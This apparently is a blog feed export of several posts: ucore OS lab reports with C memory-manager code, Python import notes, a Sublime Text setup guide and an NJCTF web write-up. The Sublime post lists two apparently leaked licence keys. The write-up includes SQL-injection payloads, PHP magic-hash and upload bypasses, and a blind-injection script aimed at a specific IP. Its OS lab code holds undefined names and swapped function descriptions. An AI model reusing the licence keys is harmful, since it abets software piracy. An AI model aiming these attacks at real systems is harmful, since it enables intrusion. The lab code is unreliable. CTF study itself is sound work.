block, return the addr of malloced block. (4.1) So you should search freelist like this: list_entry_t le = &amp;free_list; while((le=list_next(le)) != &amp;free_list) { …. (4.1.1) In while loop, get the struct page and check the p-&gt;property (record the num of free block) &gt;=n? struct Page p = le2page(le, page_link); if(p-&gt;property &gt;= n){ … (4.1.2) If we find this p, then it’ means we find a free block(block size &gt;=n), and the first n pages can be malloced. Some flag bits of this page should be setted: PG_reserved =1, PG_property =0 unlink the pages from free_list (4.1.2.1) If (p-&gt;property &gt;n), we should re-caluclate number of the the rest of this free block, (such as: le2page(le,page_link))-&gt;property = p-&gt;property - n;) (4.1.3) re-caluclate nr_free (number of the the rest of all free block) (4.1.4) return p (4.2) If we can not find a free block (block size &gt;=n), then return NULL (5) default_free_pages: relink the pages into free list, maybe merge small free blocks into big free blocks. (5.1) according the base addr of withdrawed blocks, search free list, find the correct position (from low to high addr), and insert the pages. (may use list_next, le2page, list_add_before) (5.2) reset the fields of pages, such as p-&gt;ref, p-&gt;flags (PageProperty) (5.3) try to merge low addr or high addr blocks. Notice: should change some pages’s p-&gt;property correctly. /根据实验指导书，我们第一个实验需要完成的主要是default_pmm.c中的default_init，default_init_memmap，default_alloc_pages， default_free_pages几个函数的修改。default_init/default_init: you can reuse the demo default_init fun to init the free_list and set nr_free to 0.free_list is used to record the free mem blocks. nr_free is the total number for free mem blocks./static void default_init(void) { list_init(&amp;free_list); nr_free = 0;}代码已经写好了无需改动default_init_memmap (3) default_init_memmap: CALL GRAPH: kern_init –&gt; pmm_init–&gt;page_init–&gt;init_memmap–&gt; pmm_manager-&gt;init_memmap This fun is used to init a free block (with parameter: addr_base, page_number). First you should init each page (in memlayout.h) in this free block, include: p-&gt;flags should be set bit PG_property (means this page is valid. In pmm_init fun (in pmm.c), the bit PG_reserved is setted in p-&gt;flags) if this page is free and is not the first page of free block, p-&gt;property should be set to 0. if this page is free and is the first page of free block, p-&gt;property should be set to total num of block. p-&gt;ref should be 0, because now p is free and no reference. We can use p-&gt;page_link to link this page to free_list, (such as: list_add_before(&amp;free_list, &amp;(p-&gt;page_link)); ) Finally, we should sum the number of free mem block: nr_free+=n基本的要求已经知道了，下面修改代码 源代码default_init_memmap(struct Page base, size_t n) { assert(n &gt; 0); struct Page p = base; for (; p != base + n; p ++) { assert(PageReserved(p)); p-&gt;flags = p-&gt;property = 0; set_page_ref(p, 0);//清空引用 } base-&gt;property = n;//说明连续有n个空闲块，属于空闲链表 SetPageProperty(base); nr_free += n;//说明连续有n个空闲块，属于空闲链表 list_add(&amp;free_list, &amp;(base-&gt;page_link));//}修改为default_init_memmap(struct Page base, size_t n) { assert(n &gt; 0); struct Page p = base; for (; p != base + n; p ++) {//循环判断是否为保留页 assert(PageReserved(p)); p-&gt;flags = p-&gt;property = 0; SetPageProperty(p); set_page_ref(p, 0);//清空引用 list_add_before(&amp;free_list, &amp;(base-&gt;page_link));//插入空闲链表 } base-&gt;property = n;//说明连续有n个空闲块，属于物理页管理链表// SetPageProperty(base); nr_free += n;//说明连续有n个空闲块，属于空闲链表}default_alloc_pages这个函数的作用是释放已经使用完的页，把他们合并到free_list中。 具体步骤如下： ①在free_list中查找合适的位置以供插入 ②改变被释放页的标志位，以及头部的计数器 ③尝试在free_list中向高地址或低地址合并 static struct Page default_alloc_pages(size_t n) { assert(n &gt; 0); if (n &gt; nr_free) { return NULL; } list_entry_t len; list_entry_t le = &amp;free_list; //在空闲链表中寻找合适大小的页块 while ((le = list_next(le)) != &amp;free_list) { struct Page p = le2page(le, page_link); //找到了合适大小的页块 if (p-&gt;property &gt;= n) { int i; for(i=0;i&lt;n;i++){ len = list_next(le); //让pp指向分配的那一页 //le2page宏可以根据链表元素获得对应的Page指针p struct Page pp = le2page(temp_le, page_link); //设置每一页的标志位 SetPageReserved(pp); ClearPageProperty(pp); //清除free_list中的链接 list_del(le); le = len; } if(p-&gt;property&gt;n){ //分割的页需要重新设置空闲大小 (le2page(le,page_link))-&gt;property = p-&gt;property - n; } //第一页重置标志位 ClearPageProperty(p); SetPageReserved(p); nr_free -= n; return p; } } //否则分配失败 return NULL; } default_free_pages此函数是用于为进程分配空闲页。 其分配的步骤如下： ① 寻找足够大的空闲块 ，如果找到了，重新设置标志位 ②从空闲链表中删除此页 ③判断空闲块大小是否合适 ，如果不合适，分割页块 ，如果合适则不进行操作 ④ 计算剩余空闲页个数 ⑤ 返回分配的页块地址 static void default_free_pages(struct Page base, size_t n) { assert(n &gt; 0); assert(PageReserved(base)); struct Page p = base; //查找该插入的位置le list_entry_t le = &amp;free_list; while((le=list_next(le)) != &amp;free_list){ p = le2page(le, page_link); if(p&gt;base) break; } //向le之前插入n个页（空闲），并设置标志位 for (p = base;p&lt;base+n;p++) { list_add_before(le, &amp;(p-&gt;page_link)); p-&gt;flags = 0; set_page_ref(p, 0); ClearPageProperty(p); SetPageProperty(p); } //将页块信息记录在头部 base-&gt;property = n; //是否需要合并 //向高地址合并 p = le2page(le, page_link); if (base + n == p) { base-&gt;property += p-&gt;property; p-&gt;property = 0 ; } //向低地址合并 le = list_prev(&amp;(base-&gt;page_link)); p = le2page(le, page_link); //若低地址已分配则不需要合并 if(le!=&amp;free_list &amp;&amp; p==base-1){ while(le!=&amp;free_list){ if(p-&gt;property){ p-&gt;property +=base-&gt;property; base-&gt;property = 0; break; } le = list_prev(le); p = le2page(le,page_link); } } nr_free += n； } 练习2：实现寻找虚拟地址对应的页表项这里我们需要实现的是get_pte函数，函数找到一个虚地址对应的二级页表项的内核虚地址，如果此二级页表项不存在，则分配一个包含此项的二级页表。有可能根本就没有对应的二级页表的情况，所以二级页表不必要一开始就分配，而是等到需要的时候再添加对应的二级页表。如果在查找二级页表项时，发现对应的二级页表不存在，则需要根据create参数的值来处理是否创建新的二级页表。如果create参数为0，则get_pte返回NULL；如果create参数不为0，则get_pte需要申请一个新的物理页（通过alloc_page来实现，可在mm/pmm.h中找到它的定义），再在一级页表中添加页目录项指向表示二级页表的新物理页。 当建立从一级页表到二级页表的映射时，需要注意设置控制位。这里应该设置同时设置 上PTE_U、PTE_W和PTE_P（定义可在mm/mmu.h）。如果原来就有二级页表，或者新建立了页表，则只需返回对应项的地址即可。 pte_t get_pte(pde_t pgdir, uintptr_t la, bool create) { / MACROs or Functions: PDX(la) = the index of page directory entry of VIRTUAL ADDRESS la. KADDR(pa) : takes a physical address and returns the corresponding kernel virtual address. set_page_ref(page,1) : means the page be referenced by one time page2pa(page): get the physical address of memory which this (struct Page ) page manages struct Page alloc_page() : allocation a page memset(void s, char c, size_t n) : sets the first n bytes of the memory area pointed by s to the specified value c. DEFINEs: PTE_P 0x001 // page table/directory entry flags bit : Present PTE_W 0x002 // page table/directory entry flags bit : Writeable PTE_U 0x004 // page table/directory entry flags bit : User can access / //尝试获取页表，注：typedef uintptr_t pte_t; pde_t pdep = &amp;pgdir[PDX(la)];//若获取不成功则执行下面的语句 if (!(pdep &amp; PTE_P)) {//申请一页 struct Page page; if(!creat || (page = all_page())==NULL){ return NULL; } //引用次数需要加1 set_page_ref(page, 1);//获取页的线性地址 uintptr_t pa = page2pa(page); memset(KADDR(pa), 0, PGSIZE);//设置权限 pdep = pa | PTE_U | PTE_W | PTE_P; }//返回页表地址 return &amp;((pte_t )KADDR(PDE_ADDR(pdep)))[PTX(la)]; } pde_t 全称为page directory entry，也就是一级页表的表项（注意：pgdir实际不是表项，而是一级页表本身，pgdir给出页表起始地址。）pte_t 全称为page table entry，表示二级页表的表项。uintptr_t 表示为线性地址，由于段式管理只做直接映射，所以它也是逻辑地址。PTE_U: 位3，表示用户态的软件可以读取对应地址的物理内存页内容PTE_W: 位2，表示物理内存页内容可写PTE_P: 位1，表示物理内存页存在练习3 释放某虚拟地址所在的页并取消对应的二级页表项的映射判断此页被引用的次数，如果仅仅被引用一次，则这个页也可以被释放。否则，只能释放页表入口。 修改函数page_remove_ptestatic inline voidpage_remove_pte(pde_t pgdir, uintptr_t la, pte_t ptep) {if (ptep &amp; PTE_P) { //判断页表中该表项是否存在 struct Page page = pte2page(ptep); if (page_ref_dec(page) == 0) { //判断是否只被引用了一次 free_page(page); //如果只被引用了一次，那么可以释放掉此页 } *ptep = 0; //如果被多次引用，则不能释放此页，只用释放二级页表的表项 tlb_invalidate(pgdir, la); //更新页表 }}运行结果如下]]></content>
      <tags>
        <tag>操作系统实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python import 及项目目录架构 使用总结]]></title>
    <url>%2F2017%2F03%2F31%2FPython%20%20import%20%E5%8F%8A%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E6%9E%B6%E6%9E%84%20%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[总结了python的使用方法 假设文件结构是parent/ yz/&lt;br&gt; init.py test2.py test1.py test2.py/test2.pyi = 2def function(): print 123 a = ‘hello’class ClassName(object): “””docstring for ClassName””” def init(self, arg): super(ClassName, self).init() self.arg = argyz/test2.py# -- coding:utf8 -- ‘’’wer’’’a = 37def foo(): print “I’m foo”class bar: def grok(self): print “I’m bar.grok”b = bar() import 同一文件夹下的文件test1 引用 test2import test2print test2.itest2.function()b = test2.bar()from test2 import iprint iimport 文件名 仅仅是把文件名引到了python的命名空间 利用.寻找其中的值import 不同文件夹下的文件test1 引用 yz/test2 注意这时必须在/yz文件中设置init.py(才能把文件夹识别为目录)from yz.test2 import aprint afrom yz import test2print test2.ainit.py的作用 偶尔可以看到有些人写的包下面还会有一个init.py，它的作用是在导入包时首先执行的。if name == “main” 也有时候会看到 .if name == “main“ 语句，它的作用就是当此文件没有被作为导入的文件使用时执行 if 语句块里的程序。 假如 exp.py 中加入了 if name == “main“ ，然后 python3 exp.py，就会执行这个语句块里的内容 而 如果 if name == “exp”，时则是被 其他文件 以 “import exp”导入时执行的部分 有如果是 if name == “one.exp”，时则是被 其他文件 以 “import one.exp”导入时执行的部分 注意 在 “import exp”时是不会执行 if name == “one.exp”中的内容的！同样： “import one.exp“是不会执行 if name == “exp“中的内容的项目目录架构假设你的项目名为foo, 我比较建议的最方便快捷目录结构这样就足够了:Foo/|– bin/| |– foo||– foo/| |– tests/| | |– init.py| | |– test_main.py| || |– init.py| |– main.py||– docs/| |– conf.py| |– abc.rst||– setup.py|– requirements.txt|– README简要解释一下: bin/: 存放项目的一些可执行文件，当然你可以起名script/之类的也行。 foo/: 存放项目的所有源代码。 (1) 源代码中的所有模块、包都应该放在此目录。不要置于顶层目录。 (2) 其子目录tests/存放单元测试代码； (3) 程序的入口最好命名为main.py。 docs/: 存放一些文档。 setup.py: 安装、部署、打包的脚本。 requirements.txt: 存放软件依赖的外部Python包列表。 README: 项目说明文件。]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sublime Text3 配置安装及插件选择]]></title>
    <url>%2F2017%2F03%2F29%2FSublime%20Text3%20%20%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85%E5%8F%8A%E6%8F%92%E4%BB%B6%E9%80%89%E6%8B%A9%2F</url>
    <content type="text"><![CDATA[简述这段时间一直在配置软件用了很多时间，想写篇文档规整一下sublime的配置选择 0x01 简述这段时间一直在配置软件用了很多时间，想写篇文档规整一下sublime的配置选择0x02 License—– BEGIN LICENSE —–Michael BarnesSingle User LicenseEA7E-8213858A353C41 872A0D5C DF9B2950 AFF6F667C458EA6D 8EA3C286 98D1D650 131A97ABAA919AEC EF20E143 B361B1E7 4C8B7F04B085E65E 2F5F5360 8489D422 FB8FC1AA93F6323C FD7F7544 3F39C318 D95E6480FCCC7561 8A4A1741 68FA4223 ADCEDE07200C25BE DBBC4855 C4CFB774 C5EC138C0FEC1CEF D9DCECEC D3A5DAD1 01316C36—— END LICENSE ———– BEGIN LICENSE —–Free Communities Consultoria em Informática LtdaSingle User LicenseEA7E-801302C154C122 4EFA4415 F1AAEBCC 315F3A7D2580735A 7955AA57 850ABD88 72A1DDD88D2CE060 CF980C29 890D74F2 53131895281E324E 98EA1FEF 7FF69A12 17CA7784490862AF 833E133D FD22141D D8C89B944C10A4D2 24693D70 AE37C18F 72EF0BE51ED60704 651BC71F 16CA1B77 496A0B19463EDFF9 6BEB1861 CA5BAD96 89D0118E—— END LICENSE ——0x03 初始化配置按住ctrl+`,调出面板输入import urllib2,os; pf=‘Package Control.sublime-package’; ipp = sublime.installed_packages_path(); os.makedirs( ipp ) if not os.path.exists(ipp) else None; urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler( ))); open( os.path.join( ipp, pf), ‘wb’ ).write( urllib2.urlopen( ‘http://sublime.wbond.net/‘ +pf.replace( ‘ ‘,‘%20’ )).read()); print( ‘Please restart Sublime Text to finish installation’)0x04 插件选择按住Shift+ctrl+p，输入install package。下面是一些插件的名称及安装方法，需要安装过程的会详细描述，Monokai Gray比较漂亮的主题AutoFileName自动补全路径，挺好用的SublimeREPL按F5可以跑python 程序 按键绑定 user填写{ “keys”: [“f5”],//可以自己改变 “caption”: “SublimeREPL: Python - RUN current file”, “command”: “run_existing_window_command”, “args”: { “id”: “repl_python_run”, “file”: “config/Python/Main.sublime-menu” } },Side bar &amp;&amp; Sidebar Separate侧栏增强工具与背景颜色相同Emmet初始化文档 HTML文档需要包含一些固定的标签，比如、、等，现在你只需要1秒钟就可以输入这些标签。比如输入“!”或“html:5”，然后按Tab键或ctrl+e： html:5 或!：用于HTML5文档类型 html:xt：用于XHTML过渡文档类型 html:4s：用于HTML4严格文档类型 轻松添加类、id、文本和属性 1、连续输入元素名称和ID，Emmet会自动为你补全，比如输入p#foo： 2、连续输入类和id，比如p.bar#foo，会自动生成： 3、下面来看看如何定义HTML元素的内容和属性。你可以通过输入h1{foo}和a[href=#]，就可以自动生成如下代码：声明一个带类的标签，只需输入div.item，就会生成在过去版本中，可以省略掉div，即输入.item即可生成现在如果只输入.item，则Emmet会根据父标签进行判定。比如在 中输入.item，就会生成 下面是所有的隐式标签名称： li：用于ul和ol中 tr：用于table、tbody、thead和tfoot中 td：用于tr中 option：用于select和optgroup中SublimeCodeIntel安装各种语言的补全工具。javascript找到”JavaScript”代码段，将 “codeintel_selected_catalogs”: [“jQuery”] 改为：[html] view plain copy 在CODE上查看代码片派生到我的代码片“codeintel_selected_catalogs”: [“JavaScript”]python修复在 ST3 下 SublimeCodeIntel 对 Python 无法自动补全 import 语句里的模块名的问题&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;&lt;!DOCTYPE plist PUBLIC “-//Apple//DTD PLIST 1.0//EN” “http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;&lt;plist version=“1.0”&gt;&lt;dict&gt; &lt;key&gt;scope&lt;/key&gt; &lt;string&gt;source.python&lt;/string&gt; &lt;key&gt;settings&lt;/key&gt; &lt;dict&gt; &lt;key&gt;cancelCompletion&lt;/key&gt; &lt;!– !!! WARNING !!! –&gt; &lt;!– This a modified version or the Python Package from Sublime Text 2 –&gt; &lt;!– WAS: &lt;string&gt;^(.\b(and|or)$)|(\s(pass|return|and|or|(class|def|import)\s[a-zA-Z_0-9]+)$)&lt;/string&gt; –&gt; &lt;string&gt;^(.\b(and|or)$)|(\s(pass|return|and|or|(class|def)\s[a-zA-Z_0-9]+)$)&lt;/string&gt; &lt;/dict&gt;&lt;/dict&gt;&lt;/plist&gt;将上述代码 放到 …/Sublime Text 3/Packages/Python 中。可能需要删除文件夹 …/Sublime Text 3/Cache 和文件 …/Sublime Text 3/Local/Session.sublime_session，并重启 Sublime Text 后才能生效。 亲测有效，只适用于windowsAlignment等号对齐 按Ctrl+Alt+A，可以是凌乱的代码以等号为准左右对其，适合有代码洁癖的朋友。ConvertToUTF-8sublime text本身是不支持中文编码的,所以需要通过安装插件来解决goto document这个插件能帮助我们快速查看手册。 比如我们在写php代码时， 突然忘记了某个函数怎么用了，将鼠标放在这个函数上，然后按F1，它能快速打开PHP手册中说明这个函数用法的地方Python PEP8 Autoformatpython 代码对其非常有用Anacondapython自动补全，还带实例 一是直接关闭Anaconda的这项提示，Sublime &gt; Preferences &gt; Package Settings &gt; Anaconda &gt; Settings User 中添加如下代码：{“anaconda_linting”: false}0x05 按键配置[ { “keys”: [“f5”],//可以自己改变 “caption”: “SublimeREPL: Python - RUN current file”, “command”: “run_existing_window_command”, “args”: { “id”: “repl_python_run”, “file”: “config/Python/Main.sublime-menu” } }, { “keys”: [“f1”], “command”: “side_bar_files_open_with”, “args”: { “paths”: [], “application”: “D:\Firefox\firefox.exe”, “extensions”: “.*” } }, { “keys”: [“shift+ctrl+a”], “command”: “alignment” },]]]></content>
      <tags>
        <tag>软件及应用配置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NJCTF WEB Writeup]]></title>
    <url>%2F2017%2F03%2F18%2FNJCTF%20WEB%20Writeup%2F</url>
    <content type="text"><![CDATA[Login 首先创建id 登陆进去 发现要用admin登陆 首先用爆破想想不可能 其次利用注册重新注册admin 一开始想的是利用SQL注释等注册但发现不行 其次就想到长度限制&amp;空格漏洞 ‘guest’= ‘guest ‘ 首先绕过重名检测 ，接着设置了长度限制之后用空格漏洞注册注册admin Get Flag随便输入试 Login 首先创建id 登陆进去 发现要用admin登陆 首先用爆破想想不可能 其次利用注册重新注册admin 一开始想的是利用SQL注释等注册但发现不行 其次就想到长度限制&amp;空格漏洞 ‘guest’= ‘guest ‘ 首先绕过重名检测 ，接着设置了长度限制之后用空格漏洞注册注册admin Get Flag随便输入试试 1.jpga 发现是cat 命令 利用ls 及 cat 命令查找flag Text wall首先扫描目录找到源码 .index.php.swo 发现可以读取文件，我们发现图片的存储是序列化存储 解开之后是一个数组 打印内容的时候是循环遍历打印foreach ($a as $key =&gt; $value) { echo $key,$value;}如果$a是一个类，上面的结构回将类中的变量循环打印出来 __tostring 的触发事件是echo 类，正符合此题&lt;?phpClass filelist{ public $source = ‘’;}$z = new filelist();$z-&gt;source = ‘index.php’;$y = new filelist();$y-&gt;source = $z;echo sha1(serialize($y)).serialize($y);?&gt; 打开文件夹就是flag Wallet这一题考了很多知识点 讲一下做题思路 首先发现了源码index.php.bak 源码有加密，丢淘宝解密 得到源码&lt;?phprequire_once(“db.php”);$auth = 0;if (isset($_COOKIE[“auth”])) { $auth = $_COOKIE[“auth”]; $hsh = $_COOKIE[“hsh”]; if ($auth == $hsh) { $auth = 0; } else if (sha1((string)$hsh) == md5((string)$auth)) { // $auth = 1; // } else { $auth = 0; }} else { $auth = 0; $s = $auth; setcookie(“auth”, $s); setcookie(“hsh”, sha1((string)$s));}if ($auth) { if (isset($_GET[‘query’])) { $db = new SQLite3($SQL_DATABASE, SQLITE3_OPEN_READONLY); $qstr = SQLITE3::escapeString($_GET[‘query’]); $query = “SELECT amount FROM my_wallets WHERE id=$qstr”; $result = $db-&gt;querySingle($query); if (!$result === NULL) { echo “Error - invalid query”; } else { echo “Wallet contains: $result”; // 输出flag } } else { echo “&lt;html&gt;&lt;head&gt;&lt;title&gt;Admin Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Welcome to the admin panel!&lt;br /&gt;&lt;br /&gt;&lt;form name=’input’ action=’admin.php’ method=’get’&gt;Wallet ID: &lt;input type=’text’ name=’query’&gt;&lt;input type=’submit’ value=’Submit Query’&gt;&lt;/form&gt;&lt;/body&gt;&lt;ml&gt;”; }} else echo “Sorry, not authorized.”;?&gt;首先要绕过if (isset($_COOKIE[“auth”])) { $auth = $_COOKIE[“auth”]; $hsh = $_COOKIE[“hsh”]; if ($auth == $hsh) { $auth = 0; } else if (sha1((string)$hsh) == md5((string)$auth)) { // $auth = 1; // } else { $auth = 0; }} else { $auth = 0; $s = $auth; setcookie(“auth”, $s); setcookie(“hsh”, sha1((string)$s));}利用php弱类型比较$hsh = ‘aaroZmOk’$auth = ‘QNKCDZO’登进admin 接下来就是简单的sqlite 注入 猜测为 id字段 flag表 当然也可以利用查表得到1 union select group_concat(tbl_name) from sqlite_master limit 1,1– 暴表1 union select sql from sqlite_master where tbl_name=“flag” and type=“table” limit 1,1– 爆字段1 union select group_concat(id) from flag limit 1,1–暴内容pictures‘ wall一道上传题，上传类的题目做得也不少了，都是一个套路。 看看这题 首先找到上传窗口，根据题目提示利用host：127.0.0.1登录成功找到上传界面 我们在上传时改包 上传成功，试了.php345 .inc .phtml .phpt .phps 最后.phtml可以解析，其他的都不行 print_r(scandir(“/opt/lampp/htdocs”));echo exec(‘pwd’);//查看当前文件路径print_r(scandir(‘../../‘))Be admin有时候看见密码的题目都不想做，太麻烦 利用SQLmap跑了一遍跑出了用户名及密码加密过后的值[1 entry]+———+———-+——————————————————————-+| isadmin | username | encrypted_pass |+———+———-+——————————————————————-+| 1 | admin | aVZ1c2VkQnk0ZG1pbiEhIV+W2coxQmZQWMLGaWZuItWr+E26IKb1OFh4Shf/fNSQ |+———+———-+——————————————————————-+扫描目录得到源码&lt;?phperror_reporting(0);define(“SECRET_KEY”, “……”);define(“METHOD”, “aes-128-cbc”);session_start();function get_random_token(){ $random_token=‘’; for($i=0;$i&lt;16;$i++){ $random_token.=chr(rand(1,255)); } return $random_token;}function get_identity(){ global $defaultId; $j = $defaultId; $token = get_random_token(); $c = openssl_encrypt($j, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token); $_SESSION[‘id’] = base64_encode($c); setcookie(“ID”, base64_encode($c)); setcookie(“token”, base64_encode($token)); if ($j === ‘admin’) { $_SESSION[‘isadmin’] = true; } else $_SESSION[‘isadmin’] = false;}function test_identity(){ if (!isset($_COOKIE[“token”])) return array(); if (isset($_SESSION[‘id’])) { $c = base64_decode($_SESSION[‘id’]); if ($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE[“token”]))) { if ($u === ‘admin’) { $_SESSION[‘isadmin’] = true; } else $_SESSION[‘isadmin’] = false; } else { die(“ERROR!”); } }}function login($encrypted_pass, $pass){ $encrypted_pass = base64_decode($encrypted_pass); $iv = substr($encrypted_pass, 0, 16); $cipher = substr($encrypted_pass, 16); $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); return $password == $pass;}function need_login($message = NULL) { echo “ &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\”UTF-8\”&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link rel=\”stylesheet\” href=\”CSS/target.css\”&gt; &lt;script src=\”https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\&quot;&gt;&lt;/script&amp;gt; &lt;/head&gt; &lt;body&gt;”; if (isset($message)) { echo “ &lt;div&gt;” . $message . “&lt;/div&gt;\n”; } echo “&lt;form method=\”POST\” action=’’&gt; &lt;div class=\”body\”&gt;&lt;/div&gt; &lt;div class=\”grad\”&gt;&lt;/div&gt; &lt;div class=\”header\”&gt; &lt;div&gt;Log&lt;span&gt;In&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;br&gt; &lt;div class=\”login\”&gt; &lt;input type=\”text\” placeholder=\”username\” name=\”username\”&gt; &lt;input type=\”password\” placeholder=\”password\” name=\”password\”&gt; &lt;input type=\”submit\” value=\”Login\”&gt; &lt;/div&gt; &lt;script src=’http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js&#39;&gt;&lt;/script&amp;gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;”;}function show_homepage() { echo “&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;”; global $flag; printf(“Hello ~~~ ctfer! “); if ($_SESSION[“isadmin”]) echo $flag; echo “&lt;div&gt;&lt;a href=\”logout.php\”&gt;Log out&lt;/a&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;”;}if (isset($_POST[‘username’]) &amp;&amp; isset($_POST[‘password’])) { $username = (string)$_POST[‘username’]; $password = (string)$_POST[‘password’]; $query = “SELECT username, encrypted_pass from users WHERE username=’$username’”; $res = $conn-&gt;query($query) or trigger_error($conn-&gt;error . “[$query]”); if ($row = $res-&gt;fetch_assoc()) { $uname = $row[‘username’]; $encrypted_pass = $row[“encrypted_pass”]; } if ($row &amp;&amp; login($encrypted_pass, $password)) { echo “you are in!” . “&lt;/br&gt;”; get_identity(); show_homepage(); } else { echo “&lt;script&gt;alert(‘login failed!’);&lt;/script&gt;”; need_login(“Login Failed!”); }} else { test_identity(); if (isset($_SESSION[“id”])) { show_homepage(); } else { need_login(); }}源码到手 接下来就是代码审计 查找漏洞Come On这是道注入题，所以第一步找注入点 1%df’ || if(1=1,1,0)%23 注意他过滤了&lt;&gt; or and 数据表，字段是猜出来的 1%df’ || exists(select(flag)from(flag))%23 等关键字，下面就基于内容长度的盲注import requestsstring = ‘’for i in range(1,33): for mid in range(32,127): url = “http://218.2.197.235:23733/index.php?key=1%df‘ || if((select(right(left((select(flag)from(flag)),{}),1)))=binary({}),1,0)%23”.format(str(i),str(bin(mid))) s=requests.get(url=url) content=s.content length=len(content) #print length if length &gt; 1000 : string+=chr(mid) break print string]]></content>
      <tags>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作系统实验报告 lab1]]></title>
    <url>%2F2017%2F03%2F18%2F%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%20lab1%2F</url>
    <content type="text"><![CDATA[操作系统实验报告lab1 练习11.1 操作系统镜像文件 ucore.img 是如何一步一步生成的?(需要比较详细地解释 Makefile 中每一条相关命令和命令参数的含义,以及说明命令导致的结果)利用make V= 查看执行了那些命令生成ucore.img的代码如下$(UCOREIMG): $(kernel) $(bootblock) $(V)dd if=/dev/zero of=$@ count=10000 $(V)dd if=$(bootblock) of=$@ conv=notrunc $(V)dd if=$(kernel) of=$@ seek=1 conv=notrunc $(call create_target,ucore.img)输出如下图指令： dd：用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换。 if=文件名：输入文件名，缺省为标准输入。即指定源文件。&lt; if=input file &gt; of=文件名：输出文件名，缺省为标准输出。即指定目的文件。&lt; of=output file &gt; count=blocks：仅拷贝blocks个块，块大小等于ibs指定的字节数。 conv=conversion：用指定的参数转换文件。 conv=notrunc:不截短输出文件由上描述可以看出，首先先创建一个大小为10000字节的块，然后再将bootblock，kernel拷贝过去。然而生成ucore.img需要先生成kernel和bootblock1.生成bootblock的相关代码如下$(bootblock): $(call toobj,$(bootfiles)) | $(call totarget,sign) @echo “========================$(call toobj,$(bootfiles))” @echo + ld $@ $(V)$(LD) $(LDFLAGS) -N -e start -Ttext 0x7C00 $^ -o $(call toobj,bootblock) @$(OBJDUMP) -S $(call objfile,bootblock) &gt; $(call asmfile,bootblock) @$(OBJCOPY) -S -O binary $(call objfile,bootblock) $(call outfile,bootblock) @$(call totarget,sign) $(call outfile,bootblock) $(bootblock)由上代码可得，到要生成bootblock，首先需要生成bootasm.o、bootmain.o、sign 下图是在编译时生成的中间文件生成bootasm.o、bootmain.o、sign的相关代码为：其中相关参数的含义为： ggdb 生成可供gdb使用的调试信息 -m32生成适用于32位环境的代码 -gstabs 生成stabs格式的调试信息 -nostdinc 不使用标准库 -fno-stack-protector 不生成用于检测缓冲区溢出的代码 -0s 位减小代码长度进行优化拷贝二进制代码bootblock.o到bootblock.out objcopy -S -O binary obj/bootblock.o obj/bootblock.out 其中关键的参数为 -S 移除所有符号和重定位信息 -O 指定输出格式 使用sign工具处理bootblock.out，生成bootblock bin/sign obj/bootblock.out bin/bootblock kernel = $(call totarget,kernel)$(kernel): tools/kernel.ld$(kernel): $(KOBJS) @echo + ld $@ $(V)$(LD) $(LDFLAGS) -T tools/kernel.ld -o $@ $(KOBJS) @$(OBJDUMP) -S $@ &gt; $(call asmfile,kernel) @$(OBJDUMP) -t $@ | $(SED) ‘1,/SYMBOL TABLE/d; s/ . / /; /^$$/d’ &gt; $(call symfile,kernel)$(call create_target,kernel)查看命令，生成kernel需要以下文件：ld -m elf_i386 -nostdlib -T tools/kernel.ld -o bin/kernel obj/kern/init/init.o obj/kern/libs/readline.o obj/kern/libs/stdio.o obj/kern/debug/kdebug.o obj/kern/debug/kmonitor.o obj/kern/debug/panic.o obj/kern/driver/clock.o obj/kern/driver/console.o obj/kern/driver/intr.o obj/kern/driver/picirq.o obj/kern/trap/trap.o obj/kern/trap/trapentry.o obj/kern/trap/vectors.o obj/kern/mm/pmm.o obj/libs/printfmt.o obj/libs/string.o1.2 一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？查看sign.c源代码buf[510] = 0x55;buf[511] = 0xAA;FILE ofp = fopen(argv[2], “wb+”);size = fwrite(buf, 1, 512, ofp);if (size != 512) { fprintf(stderr, “write ‘%s’ error, size is %d.\n”, argv[2], size); return -1;}从上述代码可以看出，要求硬盘主引导扇区的大小是512字节，还需要第510个字节是0x55,第511个字节为0xAA,也就是说扇区的最后两个字节内容是0x55AA练习2题目要求： 从 CPU加电后执行的第一条指令开始，单步跟踪 BIOS的执行。 在初始化位置 0x7c00 设置实地址断点,测试断点正常。 从 0x7c00 开始跟踪代码运行,将单步跟踪反汇编得到的代码与 bootasm.S和 bootblock.asm进行比较。 自己找一个 bootloader或内核中的代码位置，设置断点并进行测试2.1从 CPU加电后执行的第一条指令开始，单步跟踪 BIOS的执行。1 修改 lab1/tools/gdbinit,内容为:set architecture i8086target remote :12342.在 lab1目录下，执行make debug 执行命令如下图3.设置单步调试si 4.在gdb界面下，可通过如下命令来看BIOS的代码 x /2i $pc //显示当前eip处的汇编指令### 2.2 在初始化位置0x7c00设置实地址断点,测试断点正常 在tools/gdbinit结尾加上 set architecture i8086 